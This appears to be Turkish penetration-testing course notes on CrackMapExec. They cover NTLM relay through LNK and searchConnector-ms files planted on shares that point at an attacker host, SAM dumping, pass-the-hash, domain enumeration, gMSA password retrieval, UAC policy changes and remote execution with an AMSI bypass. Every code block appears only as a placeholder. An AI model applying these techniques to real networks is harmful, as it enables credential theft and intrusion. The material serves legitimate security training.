Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

